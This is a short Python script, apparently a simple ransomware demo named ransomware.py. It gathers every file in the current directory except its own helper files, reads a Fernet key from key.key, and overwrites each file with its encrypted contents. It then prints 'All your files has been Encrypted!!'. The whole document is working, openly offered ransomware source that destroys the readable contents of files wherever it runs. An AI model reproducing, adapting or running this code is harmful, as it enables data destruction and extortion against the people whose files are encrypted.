#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

allfiles = []
for file in  os.listdir():
    if file == 'ransomware.py' or file == "key.key" or file == "decr.py" or file == "keygen.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)

print(allfiles)

with open('key.key', 'rb') as keyfile:
    key = keyfile.read()

print("Key :" + str(key))
f = Fernet(key)

for file in allfiles:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encr = f.encrypt(content)
    with open(file, 'wb') as thefile:
        thefile.write(content_encr)

print("All your files has been Encrypted!!")